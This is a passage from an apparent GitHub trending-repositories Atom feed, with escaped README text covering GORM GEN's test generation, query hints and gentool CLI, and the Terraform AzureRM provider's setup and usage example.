([]gen.T, error)&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Unit Test&lt;/h4&gt; &#xA;&lt;p&gt;Unit test file will be generated if &lt;code&gt;WithUnitTest&lt;/code&gt; is set, which will generate unit test for general query function.&lt;/p&gt; &#xA;&lt;p&gt;Unit test for DIY method need diy testcase, which should place in the same package with test file.&lt;/p&gt; &#xA;&lt;p&gt;A testcase contains input and expectation result, input should match the method arguments, expectation should match method return values, which will be asserted &lt;strong&gt;Equal&lt;/strong&gt; in test.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package query&#xA;&#xA;type Input struct {&#xA;  Args []interface{}&#xA;}&#xA;&#xA;type Expectation struct {&#xA;  Ret []interface{}&#xA;}&#xA;&#xA;type TestCase struct {&#xA;  Input&#xA;  Expectation&#xA;}&#xA;&#xA;/* Table student */&#xA;&#xA;var StudentFindByIdTestCase = []TestCase {&#xA;  {&#xA;    Input{[]interface{}{1}},&#xA;    Expectation{[]interface{}{nil, nil}},&#xA;  },&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Corresponding test&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;//FindById select * from @@table where id = @id&#xA;func (s studentDo) FindById(id int64) (result *model.Student, err error) {&#xA;    ///&#xA;}&#xA;&#xA;func Test_student_FindById(t *testing.T) {&#xA;    student := newStudent(db)&#xA;    do := student.WithContext(context.Background()).Debug()&#xA;&#xA;    for i, tt := range StudentFindByIdTestCase {&#xA;        t.Run(&#34;FindById_&#34;+strconv.Itoa(i), func(t *testing.T) {&#xA;            res1, res2 := do.FindById(tt.Input.Args[0].(int64))&#xA;            assert(t, &#34;FindById&#34;, res1, tt.Expectation.Ret[0])&#xA;            assert(t, &#34;FindById&#34;, res2, tt.Expectation.Ret[1])&#xA;        })&#xA;    }&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Smart select fields&lt;/h4&gt; &#xA;&lt;p&gt;GEN allows select specific fields with &lt;code&gt;Select&lt;/code&gt;, if you often use this in your application, maybe you want to define a smaller struct for API usage which can select specific fields automatically, for example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;type User struct {&#xA;  ID     uint&#xA;  Name   string&#xA;  Age    int&#xA;  Gender string&#xA;  // hundreds of fields&#xA;}&#xA;&#xA;type APIUser struct {&#xA;  ID   uint&#xA;  Name string&#xA;}&#xA;&#xA;type Method interface{&#xA;    // select * from user&#xA;    FindSome() ([]APIUser, error)&#xA;}&#xA;&#xA;apiusers, err := u.WithContext(ctx).Limit(10).FindSome()&#xA;// SELECT `id`, `name` FROM `users` LIMIT 10&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Advanced Topics&lt;/h3&gt; &#xA;&lt;h4&gt;Hints&lt;/h4&gt; &#xA;&lt;p&gt;Optimizer hints allow to control the query optimizer to choose a certain query execution plan, GORM supports it with &lt;code&gt;gorm.io/hints&lt;/code&gt;, e.g:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;import &#34;gorm.io/hints&#34;&#xA;&#xA;u := query.Use(db).User&#xA;&#xA;users, err := u.WithContext(ctx).Clauses(hints.New(&#34;MAX_EXECUTION_TIME(10000)&#34;)).Find()&#xA;// SELECT * /*+ MAX_EXECUTION_TIME(10000) */ FROM `users`&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Index hints allow passing index hints to the database in case the query planner gets confused.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;import &#34;gorm.io/hints&#34;&#xA;&#xA;u := query.Use(db).User&#xA;&#xA;users, err := u.WithContext(ctx).Clauses(hints.UseIndex(&#34;idx_user_name&#34;)).Find()&#xA;// SELECT * FROM `users` USE INDEX (`idx_user_name`)&#xA;&#xA;users, err := u.WithContext(ctx).Clauses(hints.ForceIndex(&#34;idx_user_name&#34;, &#34;idx_user_id&#34;).ForJoin()).Find()&#xA;// SELECT * FROM `users` FORCE INDEX FOR JOIN (`idx_user_name`,`idx_user_id`)&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Binary&lt;/h2&gt; &#xA;&lt;p&gt;Install GEN as a binary tool:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;go install gorm.io/gen/tools/gentool@latest&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;usage:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ gentool -h&#xA;Usage of gentool:&#xA;  -db string&#xA;      input mysql or postgres or sqlite or sqlserver. consult[https://gorm.io/docs/connecting_to_the_database.html] (default &#34;mysql&#34;)&#xA;  -dsn string&#xA;      consult[https://gorm.io/docs/connecting_to_the_database.html]&#xA;  -fieldNullable&#xA;      generate with pointer when field is nullable&#xA;  -fieldWithIndexTag&#xA;      generate field with gorm index tag&#xA;  -fieldWithTypeTag&#xA;      generate field with gorm column type tag&#xA;  -modelPkgName string&#xA;      generated model code&#39;s package name&#xA;  -outFile string&#xA;      query code file name, default: gen.go&#xA;  -outPath string&#xA;      specify a directory for output (default &#34;./dao/query&#34;)&#xA;  -tables string&#xA;      enter the required data table or leave it blank&#xA;  -onlyModel&#xA;      only generate models (without query file)&#xA;  -withUnitTest&#xA;      generate unit test for query code&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gentool -dsn &#34;user:pwd@tcp(127.0.0.1:3306)/database?charset=utf8mb4&amp;amp;parseTime=True&amp;amp;loc=Local&#34; -tables &#34;orders,doctor&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Maintainers&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/riverchu&#34;&gt;@riverchu&lt;/a&gt; &lt;a href=&#34;https://github.com/idersec&#34;&gt;@iDer&lt;/a&gt; &lt;a href=&#34;https://github.com/qqxhb&#34;&gt;@qqxhb&lt;/a&gt; &lt;a href=&#34;https://github.com/dino-ma&#34;&gt;@dino-ma&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/jinzhu&#34;&gt;@jinzhu&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;You can help to deliver a better GORM/GEN&lt;/p&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;Released under the &lt;a href=&#34;https://github.com/go-gorm/gen/raw/master/License&#34;&gt;MIT License&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>hashicorp/terraform-provider-azurerm</title>
    <updated>2022-05-29T01:42:16Z</updated>
    <id>tag:github.com,2022-05-29:/hashicorp/terraform-provider-azurerm</id>
    <link href="https://github.com/hashicorp/terraform-provider-azurerm" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Terraform provider for Azure Resource Manager&lt;/p&gt;&lt;hr&gt;&lt;a href=&#34;https://terraform.io&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/hashicorp/terraform-provider-azurerm/main/.github/tf.png&#34; alt=&#34;Terraform logo&#34; title=&#34;Terraform&#34; align=&#34;left&#34; height=&#34;50&#34;&gt; &lt;/a&gt; &#xA;&lt;h1&gt;Terraform Provider for Azure (Resource Manager)&lt;/h1&gt; &#xA;&lt;p&gt;The AzureRM Terraform Provider allows managing resources within Azure Resource Manager.&lt;/p&gt; &#xA;&lt;p&gt;When using version 3.0 of the AzureRM Provider we recommend using Terraform 1.x (&lt;a href=&#34;https://www.terraform.io/downloads&#34;&gt;the latest version can be found here&lt;/a&gt;). Whilst older versions of Terraform Core (0.12.x and later) remain compatible with v3.0 of the AzureRM Provider - support for versions prior to 1.0 will be removed in the next major release of the AzureRM Provider (v4.0).&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.terraform.io&#34;&gt;Terraform Website&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs&#34;&gt;AzureRM Provider Documentation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/hashicorp/terraform-provider-azurerm/tree/main/examples&#34;&gt;AzureRM Provider Usage Examples&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://terraform-azure.slack.com&#34;&gt;Slack Workspace for Contributors&lt;/a&gt; (&lt;a href=&#34;https://join.slack.com/t/terraform-azure/shared_invite/enQtNDMzNjQ5NzcxMDc3LWNiY2ZhNThhNDgzNmY0MTM0N2MwZjE4ZGU0MjcxYjUyMzRmN2E5NjZhZmQ0ZTA1OTExMGNjYzA4ZDkwZDYxNDE&#34;&gt;Request Invite&lt;/a&gt;)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Usage Example&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-hcl&#34;&gt;# 1. Specify the version of the AzureRM Provider to use&#xA;terraform {&#xA;  required_providers {&#xA;    azurerm = {&#xA;      source = &#34;hashicorp/azurerm&#34;&#xA;      version = &#34;=3.0.1&#34;&#xA;    }&#xA;  }&#xA;}&#xA;&#xA;# 2. Configure the AzureRM Provider&#xA;provider &#34;azurerm&#34; {&#xA;  # The AzureRM Provider supports authenticating using via the Azure CLI, a Managed Identity&#xA;  # and a Service Principal. More information on the authentication methods supported by&#xA;  # the AzureRM Provider can be found here:&#xA;  # https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs#authenticating-to-azure&#xA;&#xA;  # The features block allows changing the behaviour of the Azure Provider, more&#xA;  # information can be found here:&#xA;  # https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/guides/features-block&#xA;  features {}&#xA;}&#xA;&#xA;# 3. Create a resource group&#xA;resource &#34;azurerm_resource_group&#34; &#34;example&#34; {&#xA;  name     = &#34;example-resources&#34;&#xA;  location = &#34;West Europe&#34;&#xA;}&#xA;&#xA;# 4. Create a virtual network within the resource group&#xA;resource &#34;azurerm_virtual_network&#34; &#34;example&#34; {&#xA;  name                = &#34;example-network&#34;&#xA;  resource_group_name = azurerm_resource_group.example.name&#xA;  location            = azurerm_resource_group.example.location&#xA;  address_space       = [&#34;10.0.0.0/16&#34;]&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs&#34;&gt;Usage documentation for the AzureRM Provider can be found in the Terraform Registry&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://learn.hashicorp.com/collections/terraform/azure-get-started&#34;&gt;Learn more about Terraform and the AzureRM Provider on HashiCorp Learn&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/hashicorp/terraform-provider-azurerm/tree/main/examples&#34;&gt;Additional examples can be found in the &lt;code&gt;./examples&lt;/code&gt; folder within this repository&lt;/a&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Developing the Provider&lt;/h2&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://raw.githubusercontent.com/hashicorp/terraform-provider-azurerm/main/DEVELOPER.md&#34;&gt;DEVELOPER.md&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
</feed>